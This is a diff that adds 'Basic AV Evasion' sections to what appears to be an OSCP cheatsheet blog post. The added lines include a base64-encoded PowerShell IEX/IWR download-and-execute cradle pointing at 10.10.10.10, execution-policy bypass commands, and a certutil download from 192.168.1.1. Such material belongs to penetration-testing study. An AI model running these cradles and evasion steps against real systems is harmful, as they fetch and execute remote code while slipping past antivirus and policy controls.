@@ -7,6 +7,32 @@ tags: [OSCP, Cheatsheet]
 layout: post
 ---
 
+###### Basic AV Evasion ~ File Uploads
+```
+base64 encoding a file upload to avoid badchars or to obfuscate.
+Example:
+
+in linux:
+> echo "powershell.exe -c 'IEX(IWR http://10.10.10.10/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
+result = a base64 blob.
+
+Then run on attacker machine:
+> powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAJwBJAEUAWAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBmAGkAbABlAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAJwAKAA==
+```
+
+###### Basic AV Evasion ~ Powershell Execution Policy Bypass
+```
+> Get-ExecutionPolicy -Scope CurrentUser
+> Get-ExecutionPolicy
+
+Disable Execution Policy Protection for PowerShell
+> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+> Set-ExecutionPolicy Unrestricted
+
+Or avoid the protection for 1 command:
+> powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.1.1:80/file.txt}"
+```
+
 
 ###### Start Process with PowerShell
 ```
